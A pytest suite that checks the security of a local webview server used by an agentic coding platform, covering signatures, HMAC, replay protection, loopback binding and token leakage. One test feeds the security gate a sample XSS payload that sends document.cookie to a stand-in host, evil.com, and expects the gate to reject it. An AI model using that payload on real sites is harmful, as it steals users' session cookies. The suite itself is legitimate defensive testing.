"""
Comprehensive tests for secure communication channel between the webview
browser client and the agentic coding platform (server).

This module validates that NO other service, process, or network entity
can impersonate the agentic coding platform or tamper with messages.

Coverage mapping:
  OWASP Top 10 2021:
    A01 Broken Access Control   — channel isolation, no unauthorized access
    A02 Cryptographic Failures  — key exchange, signature binding
    A04 Insecure Design         — channel binding design verification
    A05 Security Misconfiguration — network binding, port isolation
    A07 Auth Failures           — multi-factor channel authentication
    A08 Integrity Failures      — message integrity, anti-tamper
  OWASP LLM Top 10 2025:
    LLM01 Prompt Injection      — forged state from external process
    LLM02 Sensitive Disclosure  — token exposure vectors
    LLM04 Data Poisoning        — injected state from rogue process
    LLM05 Improper Output       — forged server messages to browser
  MITRE ATT&CK:
    T1040 Network Sniffing         — token in transit, WS protocol
    T1071 Application Layer Proto  — protocol-level impersonation
    T1078 Valid Accounts           — stolen token resistance
    T1134 Token Manipulation       — forged/modified tokens
    T1185 Browser Session Hijack   — WebSocket hijacking, session theft
    T1195 Supply Chain Compromise  — dependency integrity
    T1539 Steal Web Session Cookie — token storage and exposure
    T1550 Alternate Auth Material  — replay, credential reuse
    T1557 Adversary-in-the-Middle  — MITM on localhost, proxy injection
    T1565 Data Manipulation        — state/action tampering in transit
"""

from __future__ import annotations

import hashlib
import hmac as hmac_module
import json
import os
import time
from pathlib import Path

import pytest
from crypto_utils import (
    NonceTracker,
    _lazy_nacl,
    generate_nonce,
    generate_session_keys,
    sign_message,
    verify_hmac,
)

# ═══════════════════════════════════════════════════════════════════════════════
# 1. CHANNEL BINDING — Proving the server is the genuine agent
# ═══════════════════════════════════════════════════════════════════════════════


class TestChannelBinding:
    """Verify that the communication channel is bound to the genuine server
    via ephemeral cryptographic identity established at session start."""

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    @pytest.mark.mitre_t1557
    def test_ephemeral_keypair_per_session(self):
        """Each session gets a unique keypair — no reuse across sessions."""
        keys_a = generate_session_keys()
        keys_b = generate_session_keys()
        assert keys_a[0] != keys_b[0], "Private keys must differ per session"
        # In HMAC-only mode (no PyNaCl), public keys are empty strings (by design)
        if keys_a[1] and keys_b[1]:
            assert keys_a[1] != keys_b[1], "Public keys must differ per session"

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    @pytest.mark.mitre_t1557
    def test_public_key_binds_server_to_browser(self):
        """The public key delivered in bootstrap binds all subsequent messages
        to the server that generated it. A different server cannot sign valid messages."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        # Real server
        real_priv, real_pub, _ = generate_session_keys()
        # Rogue server
        rogue_priv, rogue_pub, _ = generate_session_keys()

        payload = '{"type":"state_updated","data":{"status":"compromised"}}'
        nonce = generate_nonce()

        # Rogue signs the message with its own key
        rogue_sig = sign_message(rogue_priv, payload, nonce)

        # Browser has the REAL public key from bootstrap
        verify_key = nacl.signing.VerifyKey(bytes.fromhex(real_pub))

        # Verification with real key must fail for rogue signature
        with pytest.raises(Exception):
            verify_key.verify(
                (nonce + "\x00" + payload).encode("utf-8"),
                bytes.fromhex(rogue_sig),
            )

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    def test_session_token_binds_browser_to_server(self):
        """The session token (shared secret) delivered in bootstrap binds
        browser→server HMAC messages to the legitimate session."""
        real_token = os.urandom(32).hex()
        rogue_token = os.urandom(32).hex()

        payload = '{"type":"action","data":{"action_id":"x","type":"confirm","value":true}}'
        nonce = generate_nonce()

        # Browser signs with real token
        message = (nonce + "\x00" + payload).encode("utf-8")
        browser_sig = hmac_module.new(real_token.encode(), message, hashlib.sha256).hexdigest()

        # Real server can verify
        assert verify_hmac(real_token, payload, nonce, browser_sig) is True

        # Rogue server with different token CANNOT verify
        assert verify_hmac(rogue_token, payload, nonce, browser_sig) is False

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a04
    def test_dual_channel_authentication(self):
        """The protocol uses DUAL authentication:
        1. Ed25519 signatures for server→browser (asymmetric)
        2. HMAC-SHA256 for browser→server (symmetric with session token)
        This ensures both directions are independently authenticated."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        server_priv, server_pub, _ = generate_session_keys()
        session_token = os.urandom(32).hex()

        # Direction 1: server→browser (Ed25519)
        s2b_payload = '{"type":"state_updated","data":{}}'
        s2b_nonce = generate_nonce()
        s2b_sig = sign_message(server_priv, s2b_payload, s2b_nonce)

        verify_key = nacl.signing.VerifyKey(bytes.fromhex(server_pub))
        verify_key.verify(
            (s2b_nonce + "\x00" + s2b_payload).encode("utf-8"),
            bytes.fromhex(s2b_sig),
        )  # Should not raise

        # Direction 2: browser→server (HMAC-SHA256)
        b2s_payload = '{"type":"action","data":{"action_id":"a","type":"confirm","value":true}}'
        b2s_nonce = generate_nonce()
        b2s_message = (b2s_nonce + "\x00" + b2s_payload).encode("utf-8")
        b2s_sig = hmac_module.new(session_token.encode(), b2s_message, hashlib.sha256).hexdigest()

        assert verify_hmac(session_token, b2s_payload, b2s_nonce, b2s_sig) is True


# ═══════════════════════════════════════════════════════════════════════════════
# 2. PROCESS IMPERSONATION PREVENTION — MITRE T1071, T1134
# ═══════════════════════════════════════════════════════════════════════════════


class TestProcessImpersonation:
    """Verify that a rogue local process cannot impersonate the agent server."""

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1071
    @pytest.mark.mitre_t1134
    def test_rogue_process_cannot_sign_state_updates(self):
        """A process without the private key cannot produce valid signatures."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        real_priv, real_pub, _ = generate_session_keys()
        rogue_priv, _, _ = generate_session_keys()

        payload = '{"type":"state_updated","data":{"status":"ready","data":{"ui":{"sections":[{"type":"text","content":"You have been hacked"}]}}}}'
        nonce = generate_nonce()

        # Rogue attempts to sign
        rogue_sig = sign_message(rogue_priv, payload, nonce)

        # Browser verification with real public key fails
        verify_key = nacl.signing.VerifyKey(bytes.fromhex(real_pub))
        with pytest.raises(Exception):
            verify_key.verify(
                (nonce + "\x00" + payload).encode("utf-8"),
                bytes.fromhex(rogue_sig),
            )

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1071
    def test_rogue_process_cannot_forge_browser_messages(self):
        """A rogue process cannot forge valid HMAC-signed browser→server messages
        without knowing the session token."""
        real_token = os.urandom(32).hex()
        rogue_token = os.urandom(32).hex()

        payload = '{"type":"action","data":{"action_id":"hack","type":"delete","value":true}}'
        nonce = generate_nonce()

        # Rogue signs with wrong token
        rogue_msg = (nonce + "\x00" + payload).encode("utf-8")
        rogue_sig = hmac_module.new(rogue_token.encode(), rogue_msg, hashlib.sha256).hexdigest()

        # Server rejects
        assert verify_hmac(real_token, payload, nonce, rogue_sig) is False

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1134
    def test_token_is_high_entropy(self):
        """Session tokens must have sufficient entropy (32 bytes = 256 bits)."""
        token = os.urandom(32).hex()
        assert len(token) == 64  # 64 hex chars = 32 bytes
        # Check uniqueness of 100 tokens
        tokens = {os.urandom(32).hex() for _ in range(100)}
        assert len(tokens) == 100

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1071
    def test_rogue_ws_message_without_signature_handled(self):
        """If a rogue process sends an unsigned WS message, the server
        should still handle it (for backwards compat) but the HMAC check
        would fail if envelope is expected."""
        import inspect

        # Verify the WS handler checks for signature fields before processing
        from ws_handler import WebSocketHandler

        ws_handler_src = inspect.getsource(WebSocketHandler.handle)
        # Handler must check for "sig" and "nonce" fields in the message
        assert '"sig"' in ws_handler_src or "'sig'" in ws_handler_src, (
            "_handle_ws must check for 'sig' field in messages"
        )
        assert '"nonce"' in ws_handler_src or "'nonce'" in ws_handler_src, (
            "_handle_ws must check for 'nonce' field in messages"
        )

    @pytest.mark.secure_comms
    @pytest.mark.llm04
    def test_rogue_state_file_write_detected_by_gate(self):
        """If a rogue process writes malicious state.json, the security gate
        should catch XSS payloads when the file watcher broadcasts."""
        from security_gate import SecurityGate

        gate = SecurityGate()

        rogue_state = {
            "version": 999,
            "status": "ready",
            "title": "Normal Update",
            "message": '<script>fetch("http://evil.com/exfil?d="+document.cookie)</script>',
        }
        ok, err, _ = gate.validate_state(json.dumps(rogue_state))
        assert not ok, "Security gate should catch XSS from rogue state file"


# ═══════════════════════════════════════════════════════════════════════════════
# 3. NETWORK ISOLATION — MITRE T1040, T1568; OWASP A05, A10
# ═══════════════════════════════════════════════════════════════════════════════


class TestNetworkIsolation:
    """Server must only be accessible from localhost."""

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a05
    @pytest.mark.owasp_a10
    @pytest.mark.mitre_t1568
    def test_server_binds_loopback_only(self):
        """Verify that the server code binds to 127.0.0.1 (not 0.0.0.0)."""
        import inspect

        import webview_server

        source = inspect.getsource(webview_server.WebviewServer.start)
        # The asyncio.start_server call should use "127.0.0.1"
        assert '"127.0.0.1"' in source or "'127.0.0.1'" in source

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a05
    @pytest.mark.mitre_t1568
    def test_ws_server_binds_loopback_only(self):
        """WebSocket server must also bind to 127.0.0.1."""
        import inspect

        import webview_server

        source = inspect.getsource(webview_server.WebviewServer.start)
        # Count 127.0.0.1 occurrences — should appear for both HTTP and WS
        assert source.count("127.0.0.1") >= 2

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1040
    def test_no_remote_connect_src_in_csp(self):
        """CSP connect-src must not allow remote WebSocket or HTTP connections."""
        import inspect

        import webview_server

        # CSP is built in _send_raw, which generates all HTTP responses
        csp_src = inspect.getsource(webview_server.WebviewHTTPHandler._send_raw)
        # CSP must be present
        assert "Content-Security-Policy" in csp_src, "CSP header must be set"
        # connect-src must restrict to localhost only
        assert "connect-src" in csp_src, "CSP must include connect-src directive"
        # Must NOT allow wildcards or remote WS/HTTP
        assert "ws://*" not in csp_src, "CSP must not allow wildcard WebSocket"
        assert "wss://" not in csp_src, "CSP must not allow secure WebSocket (localhost only)"
        assert "https://" not in csp_src, "CSP must not allow remote HTTPS connections"

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1040
    def test_token_not_in_url_parameters(self):
        """The session token should NOT be passed as a URL query parameter
        (visible in logs, referrer headers, browser history)."""
        import inspect

        # Check the SDK connector: should use first-message auth
        from ws_handler import WebSocketHandler

        source = inspect.getsource(WebSocketHandler.handle)
        # Legacy query-param auth exists but should be secondary
        assert "first_msg" in source.lower() or "first_msg_raw" in source


# ═══════════════════════════════════════════════════════════════════════════════
# 4. MITM PREVENTION — MITRE T1557
# ═══════════════════════════════════════════════════════════════════════════════


class TestMITMPrevention:
    """Adversary-in-the-middle attack prevention."""

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    def test_message_integrity_server_to_browser(self):
        """Modifying any byte of a server→browser message is detectable."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        priv, pub, _ = generate_session_keys()
        payload = '{"type":"state_updated","data":{"version":1,"status":"ready"}}'
        nonce = generate_nonce()
        sig = sign_message(priv, payload, nonce)

        verify_key = nacl.signing.VerifyKey(bytes.fromhex(pub))

        # Tamper with one character
        tampered = payload[:20] + "X" + payload[21:]
        with pytest.raises(Exception):
            verify_key.verify(
                (nonce + "\x00" + tampered).encode("utf-8"),
                bytes.fromhex(sig),
            )

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    def test_message_integrity_browser_to_server(self):
        """Modifying any byte of a browser→server message is detectable."""
        token = os.urandom(32).hex()
        payload = '{"type":"action","data":{"action_id":"ok","type":"confirm","value":true}}'
        nonce = generate_nonce()
        message = (nonce + "\x00" + payload).encode("utf-8")
        sig = hmac_module.new(token.encode(), message, hashlib.sha256).hexdigest()

        # Tamper with one character
        tampered = payload[:10] + "Z" + payload[11:]
        assert verify_hmac(token, tampered, nonce, sig) is False

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    def test_nonce_swap_detected(self):
        """Swapping the nonce from one message onto another is detectable."""
        token = os.urandom(32).hex()
        payload_a = '{"type":"action","data":{"action_id":"a"}}'
        nonce_a = generate_nonce()
        nonce_b = generate_nonce()

        msg_a = (nonce_a + "\x00" + payload_a).encode("utf-8")
        sig_a = hmac_module.new(token.encode(), msg_a, hashlib.sha256).hexdigest()

        # Try to use nonce_b with sig_a
        assert verify_hmac(token, payload_a, nonce_b, sig_a) is False

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    @pytest.mark.mitre_t1565
    def test_signature_reuse_across_messages_fails(self):
        """Using a valid signature from message A on message B fails."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        priv, pub, _ = generate_session_keys()
        nonce = generate_nonce()

        payload_a = '{"type":"state_updated","data":{"status":"ready"}}'
        sig_a = sign_message(priv, payload_a, nonce)

        payload_b = '{"type":"state_updated","data":{"status":"error","message":"pwned"}}'

        verify_key = nacl.signing.VerifyKey(bytes.fromhex(pub))
        with pytest.raises(Exception):
            verify_key.verify(
                (nonce + "\x00" + payload_b).encode("utf-8"),
                bytes.fromhex(sig_a),
            )

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1557
    def test_proxy_cannot_forge_without_key(self):
        """A localhost proxy that intercepts traffic cannot forge messages
        without the private key (Ed25519) or session token (HMAC)."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        real_priv, real_pub, _ = generate_session_keys()
        real_token = os.urandom(32).hex()

        # Proxy intercepts a server message and tries to inject its own
        malicious_payload = '{"type":"state_updated","data":{"status":"ready","message":"<script>evil()</script>"}}'
        fake_nonce = generate_nonce()

        # Proxy doesn't have the real private key
        proxy_priv, _, _ = generate_session_keys()
        proxy_sig = sign_message(proxy_priv, malicious_payload, fake_nonce)

        # Browser rejects (uses real public key)
        verify_key = nacl.signing.VerifyKey(bytes.fromhex(real_pub))
        with pytest.raises(Exception):
            verify_key.verify(
                (fake_nonce + "\x00" + malicious_payload).encode("utf-8"),
                bytes.fromhex(proxy_sig),
            )

        # Proxy also can't forge browser messages without the session token
        proxy_token = os.urandom(32).hex()
        proxy_b2s = (fake_nonce + "\x00" + malicious_payload).encode("utf-8")
        proxy_hmac = hmac_module.new(proxy_token.encode(), proxy_b2s, hashlib.sha256).hexdigest()
        assert verify_hmac(real_token, malicious_payload, fake_nonce, proxy_hmac) is False


# ═══════════════════════════════════════════════════════════════════════════════
# 5. REPLAY ATTACK PREVENTION — MITRE T1185, T1550
# ═══════════════════════════════════════════════════════════════════════════════


class TestReplayPrevention:
    """Captured messages cannot be replayed to either direction."""

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1185
    @pytest.mark.mitre_t1550
    def test_replayed_browser_message_rejected(self):
        """A captured browser→server message replayed later is rejected."""
        tracker = NonceTracker(window_seconds=300)
        token = os.urandom(32).hex()

        payload = '{"type":"action","data":{"action_id":"approve","type":"approve","value":true}}'
        nonce = generate_nonce()
        message = (nonce + "\x00" + payload).encode("utf-8")
        sig = hmac_module.new(token.encode(), message, hashlib.sha256).hexdigest()

        # First delivery: accepted
        assert verify_hmac(token, payload, nonce, sig) is True
        assert tracker.check_and_record(nonce) is True

        # Replay: nonce already seen
        assert tracker.check_and_record(nonce) is False

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1185
    def test_replayed_server_message_rejected_by_nonce(self):
        """Browser-side nonce tracking rejects replayed server messages.
        We simulate the browser's nonce check."""
        seen_nonces = {}

        nonce = generate_nonce()

        # First receipt: nonce not seen → accept
        assert nonce not in seen_nonces
        seen_nonces[nonce] = time.time() * 1000

        # Replay: nonce already seen → reject
        assert nonce in seen_nonces

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1550
    def test_old_nonce_with_new_payload_rejected(self):
        """Attacker reuses a valid nonce from an old message with a new payload.
        The HMAC check will fail because the nonce is part of the signed content."""
        token = os.urandom(32).hex()
        tracker = NonceTracker()

        # Original message
        old_nonce = generate_nonce()
        old_payload = '{"type":"action","data":{"action_id":"safe"}}'
        old_msg = (old_nonce + "\x00" + old_payload).encode("utf-8")
        old_sig = hmac_module.new(token.encode(), old_msg, hashlib.sha256).hexdigest()

        # Record the nonce
        tracker.check_and_record(old_nonce)

        # Attacker creates new payload but reuses old nonce
        new_payload = '{"type":"action","data":{"action_id":"hack","type":"delete"}}'
        # The old signature won't match the new payload
        assert verify_hmac(token, new_payload, old_nonce, old_sig) is False

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1185
    def test_rapid_replay_storm(self):
        """Rapid replay of the same nonce — all replays must be rejected."""
        tracker = NonceTracker()
        nonce = generate_nonce()
        tracker.check_and_record(nonce)

        for _ in range(1000):
            assert tracker.check_and_record(nonce) is False


# ═══════════════════════════════════════════════════════════════════════════════
# 6. TOKEN EXPOSURE VECTORS — LLM02; MITRE T1539
# ═══════════════════════════════════════════════════════════════════════════════


class TestTokenExposure:
    """Verify the session token is not exposed through any unintended channel."""

    @pytest.mark.secure_comms
    @pytest.mark.llm02
    @pytest.mark.mitre_t1539
    def test_token_not_in_state_json(self, tmp_path):
        """state.json should never contain the session token."""
        from mcp_server import WebviewSession

        session = WebviewSession(work_dir=tmp_path, open_browser=False)
        session.session_token = os.urandom(32).hex()
        # Ensure the data directory exists (normally created by ensure_started)
        session.data_dir.mkdir(parents=True, exist_ok=True)
        state = {"title": "Test", "status": "ready", "message": "hello"}
        session.write_state(state)

        state_json_contents = (session.data_dir / "state.json").read_text()
        assert session.session_token not in state_json_contents, "Session token must not appear in state.json"

    @pytest.mark.secure_comms
    @pytest.mark.llm02
    @pytest.mark.mitre_t1539
    def test_token_not_logged(self):
        """Server logging must not contain full session tokens.
        The server only logs truncated token prefix, not the full value."""
        import inspect

        import webview_server

        source = inspect.getsource(webview_server.WebviewServer.__init__)
        # Check both print() and logger calls — production uses logger, not print
        for line in source.split("\n"):
            stripped = line.strip()
            if stripped.startswith("#"):
                continue
            # Full token reference in any output statement
            if any(kw in stripped for kw in ("print(", "logger.", "logging.")):
                # session_token without truncation slice is a leak
                if "self.session_token" in stripped and "[:8]" not in stripped and "[:16]" not in stripped:
                    # Allow comparisons and assignments, only flag output
                    if "self.session_token" not in stripped.split("=")[0].strip():
                        msg = f"Full token may leak in log/print: {stripped}"
                        raise AssertionError(msg)

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1539
    def test_token_not_in_ws_url(self):
        """First-message auth should be preferred over query-param auth.
        Token in URL is visible in logs and referrer headers."""
        # Verify the SDK and server use first-message auth, not URL params
        sdk_path = Path(__file__).resolve().parent.parent.parent / "assets" / "sdk" / "openwebgoggles-sdk.js"
        sdk_src = sdk_path.read_text()
        # SDK must use first-message auth pattern (sends JSON with type: "auth")
        assert '"type":"auth"' in sdk_src or "'type':'auth'" in sdk_src or '"auth"' in sdk_src, (
            "SDK must use first-message auth, not URL parameter auth"
        )
        # SDK WS URL construction must not include token as query parameter
        assert "?token=" not in sdk_src, "Token must not be passed as URL query parameter"
        assert "&token=" not in sdk_src, "Token must not be passed as URL query parameter"

    @pytest.mark.secure_comms
    @pytest.mark.llm02
    def test_manifest_api_strips_token(self):
        """The public /_api/manifest endpoint strips the token before responding."""
        from webview_server import _strip_token

        manifest = {
            "session": {"id": "test-123", "token": "secret_abc"},
            "server": {"host": "127.0.0.1"},
        }
        safe = _strip_token(manifest)
        assert "token" not in safe["session"], "Token should be removed from stripped manifest"
        assert "token" in manifest["session"], "Original manifest should not be mutated"
        assert manifest["session"]["token"] == "secret_abc", "Original token value should be unchanged"


# ═══════════════════════════════════════════════════════════════════════════════
# 7. SUPPLY CHAIN & DEPENDENCY INTEGRITY — LLM03; MITRE T1195
# ═══════════════════════════════════════════════════════════════════════════════


class TestSupplyChainIntegrity:
    """Verify dependency usage patterns are secure."""

    @pytest.mark.secure_comms
    @pytest.mark.llm03
    @pytest.mark.mitre_t1195
    def test_crypto_uses_standard_libraries(self):
        """Cryptographic operations should use well-known libraries."""
        import inspect

        import crypto_utils

        source = inspect.getsource(crypto_utils)

        # Should use PyNaCl for Ed25519
        assert "nacl.signing" in source
        assert "nacl.encoding" in source

        # Should use stdlib hmac for HMAC-SHA256
        assert "import hmac" in source
        assert "import hashlib" in source

        # Should use os.urandom for randomness
        assert "os.urandom" in source

    @pytest.mark.secure_comms
    @pytest.mark.llm03
    def test_no_eval_or_exec_in_server(self):
        """Server code should not use eval() or exec()."""
        import inspect

        import webview_server

        source = inspect.getsource(webview_server)
        # Remove string literals to avoid false positives
        # Simple check: eval( and exec( should not appear outside strings
        assert "eval(" not in source
        assert "exec(" not in source

    @pytest.mark.secure_comms
    @pytest.mark.llm03
    def test_no_eval_or_exec_in_security_gate(self):
        import inspect

        from security_gate import SecurityGate

        source = inspect.getsource(SecurityGate)
        assert "eval(" not in source
        assert "exec(" not in source

    @pytest.mark.secure_comms
    @pytest.mark.llm03
    def test_no_pickle_or_marshal_in_server(self):
        """No use of pickle/marshal (deserialization attacks)."""
        import inspect

        import webview_server

        source = inspect.getsource(webview_server)
        assert "pickle" not in source
        assert "marshal" not in source


# ═══════════════════════════════════════════════════════════════════════════════
# 8. WEBSOCKET AUTHENTICATION — OWASP A07; MITRE T1078, T1185
# ═══════════════════════════════════════════════════════════════════════════════


class TestWebSocketAuthentication:
    """WebSocket connection authentication protocol."""

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a07
    @pytest.mark.mitre_t1078
    def test_ws_auth_protocol_requires_first_message(self):
        """The WS handler should expect an auth message as the first message."""
        import inspect

        from ws_handler import WebSocketHandler

        source = inspect.getsource(WebSocketHandler.handle)
        assert "first_msg" in source or "auth" in source

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a07
    def test_ws_auth_timeout_exists(self):
        """WS auth should have a timeout to prevent hanging connections."""
        import inspect

        from ws_handler import WebSocketHandler

        source = inspect.getsource(WebSocketHandler.handle)
        assert "timeout" in source

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a07
    @pytest.mark.mitre_t1185
    def test_ws_unauthorized_close_code(self):
        """Unauthorized WS connections should close with 4001."""
        import inspect

        from ws_handler import WebSocketHandler

        source = inspect.getsource(WebSocketHandler.handle)
        assert "4001" in source

    @pytest.mark.secure_comms
    @pytest.mark.mitre_t1078
    def test_ws_signed_messages_have_envelope(self):
        """Server→browser WS messages should be wrapped in {nonce, sig, p} envelope."""
        import inspect

        from ws_handler import WebSocketHandler

        source = inspect.getsource(WebSocketHandler.send_signed)
        assert '"nonce"' in source or "'nonce'" in source
        assert '"sig"' in source or "'sig'" in source
        assert '"p"' in source or "'p'" in source


# ═══════════════════════════════════════════════════════════════════════════════
# 9. CROSS-CUTTING SECURITY PROPERTIES
# ═══════════════════════════════════════════════════════════════════════════════


class TestCrossCuttingSecurity:
    """Properties that span multiple components."""

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a08
    def test_complete_message_lifecycle(self):
        """End-to-end test: server creates signed state → browser verifies →
        browser sends signed action → server verifies → replay rejected."""
        nacl = _lazy_nacl()
        if nacl is None:
            pytest.skip("PyNaCl not available")

        # Setup
        server_priv, server_pub, _ = generate_session_keys()
        session_token = os.urandom(32).hex()
        server_tracker = NonceTracker()

        # 1. Server sends signed state
        state_payload = json.dumps({"type": "state_updated", "data": {"version": 1}})
        state_nonce = generate_nonce()
        state_sig = sign_message(server_priv, state_payload, state_nonce)

        # 2. Browser verifies server signature
        verify_key = nacl.signing.VerifyKey(bytes.fromhex(server_pub))
        verify_key.verify(
            (state_nonce + "\x00" + state_payload).encode("utf-8"),
            bytes.fromhex(state_sig),
        )

        # 3. Browser sends signed action
        action_payload = json.dumps({"type": "action", "data": {"action_id": "ok", "type": "confirm", "value": True}})
        action_nonce = generate_nonce()
        action_message = (action_nonce + "\x00" + action_payload).encode("utf-8")
        action_sig = hmac_module.new(session_token.encode(), action_message, hashlib.sha256).hexdigest()

        # 4. Server verifies browser HMAC
        assert verify_hmac(session_token, action_payload, action_nonce, action_sig) is True

        # 5. Server records nonce
        assert server_tracker.check_and_record(action_nonce) is True

        # 6. Replay rejected
        assert server_tracker.check_and_record(action_nonce) is False

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a04
    def test_defense_in_depth_layers(self):
        """Verify multiple independent security layers exist:
        1. Network isolation (127.0.0.1)
        2. Bearer token auth (HTTP)
        3. First-message auth (WebSocket)
        4. Ed25519 signatures (server→browser integrity)
        5. HMAC-SHA256 (browser→server integrity)
        6. Nonce replay protection
        7. CSP (browser sandbox)
        8. SecurityGate (content validation)
        This is a structural/design verification test."""

        # Layer 1: Network isolation
        import inspect

        import webview_server

        start_source = inspect.getsource(webview_server.WebviewServer.start)
        assert "127.0.0.1" in start_source

        # Layer 2: Bearer token
        handler_source = inspect.getsource(webview_server.WebviewHTTPHandler._check_token)
        assert "Bearer" in handler_source

        # Layer 3: WS first-message auth (logic lives in WebSocketHandler.handle)
        from ws_handler import WebSocketHandler

        ws_source = inspect.getsource(WebSocketHandler.handle)
        assert "auth" in ws_source.lower()

        # Layer 4: Ed25519
        from crypto_utils import sign_message as sm

        assert sm is not None

        # Layer 5: HMAC
        from crypto_utils import verify_hmac as vh

        assert vh is not None

        # Layer 6: Nonce tracking
        from crypto_utils import NonceTracker as NT

        assert NT is not None

        # Layer 7: CSP
        raw_source = inspect.getsource(webview_server.WebviewHTTPHandler._send_raw)
        assert "Content-Security-Policy" in raw_source

        # Layer 8: SecurityGate
        from security_gate import SecurityGate as SG

        assert SG is not None

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_key_material_never_on_disk(self):
        """Verify that the server stores keys in memory only (no file writes)."""
        import inspect

        import webview_server

        init_source = inspect.getsource(webview_server.WebviewServer.__init__)
        # Private key should be stored in self._private_key (memory)
        assert "_private_key" in init_source
        # Should NOT write key to any file
        assert "write_text" not in init_source or "_private_key" not in init_source.split("write_text")[0][-100:]

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_key_zeroed_on_shutdown(self):
        """Server must zero key material when shutting down."""
        import inspect

        import webview_server

        start_source = inspect.getsource(webview_server.WebviewServer.start)
        assert "zero_key" in start_source


# ═══════════════════════════════════════════════════════════════════════════════
# H12: NaCl fallback paths — when PyNaCl is unavailable
# ═══════════════════════════════════════════════════════════════════════════════


class TestNaClFallback:
    """Test the HMAC-only fallback paths when PyNaCl is not installed."""

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_lazy_nacl_returns_none_when_unavailable(self):
        """_lazy_nacl should return None when PyNaCl can't be imported."""
        from unittest import mock

        with mock.patch.dict("sys.modules", {"nacl": None, "nacl.signing": None, "nacl.encoding": None}):
            # Force re-import path by patching the builtins import

            import crypto_utils

            original = crypto_utils._lazy_nacl

            def _mocked_lazy_nacl():
                try:
                    import nacl.encoding  # noqa: F811
                    import nacl.signing  # noqa: F811

                    return nacl
                except (ImportError, ModuleNotFoundError):
                    return None

            crypto_utils._lazy_nacl = _mocked_lazy_nacl
            try:
                result = crypto_utils._lazy_nacl()
                assert result is None
            finally:
                crypto_utils._lazy_nacl = original

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_generate_keys_without_nacl(self):
        """generate_session_keys should return HMAC-only keys when NaCl unavailable."""
        from unittest import mock

        with mock.patch("crypto_utils._lazy_nacl", return_value=None):
            seed, pub_hex, verify_hex = generate_session_keys()

        # In fallback mode, public/verify keys are empty strings
        assert pub_hex == ""
        assert verify_hex == ""
        # Seed should be 32 bytes (SHA-256 of "hmac-signing-key:" + random)
        assert len(seed) == 32
        assert isinstance(seed, bytes)

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_sign_message_falls_back_to_hmac(self):
        """sign_message should use HMAC-SHA256 when NaCl is unavailable."""
        from unittest import mock

        with mock.patch("crypto_utils._lazy_nacl", return_value=None):
            seed, _, _ = generate_session_keys()
            nonce = generate_nonce()
            payload = '{"test": "data"}'
            sig = sign_message(seed, payload, nonce)

        # The signature should be a valid hex string
        assert len(sig) == 64  # SHA-256 produces 32 bytes = 64 hex chars
        # Verify it matches expected HMAC
        import hmac as hmac_stdlib

        message = (nonce + "\x00" + payload).encode("utf-8")
        expected = hmac_stdlib.new(seed, message, hashlib.sha256).digest().hex()
        assert sig == expected

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_fallback_keys_are_unique_per_session(self):
        """Even in HMAC-only mode, each session must get unique keys."""
        from unittest import mock

        keys = set()
        with mock.patch("crypto_utils._lazy_nacl", return_value=None):
            for _ in range(50):
                seed, _, _ = generate_session_keys()
                keys.add(seed)
        assert len(keys) == 50, "Each HMAC-only session key must be unique"

    @pytest.mark.secure_comms
    @pytest.mark.owasp_a02
    def test_fallback_sign_and_verify_roundtrip(self):
        """In HMAC-only mode, sign+verify should still work for browser→server."""
        from unittest import mock

        with mock.patch("crypto_utils._lazy_nacl", return_value=None):
            seed, _, _ = generate_session_keys()
            nonce = generate_nonce()
            payload = '{"action":"approve"}'
            sig = sign_message(seed, payload, nonce)

        # Verify using the same key and HMAC logic
        message = (nonce + "\x00" + payload).encode("utf-8")
        expected = hmac_module.new(seed, message, hashlib.sha256).digest()
        assert hmac_module.compare_digest(bytes.fromhex(sig), expected)
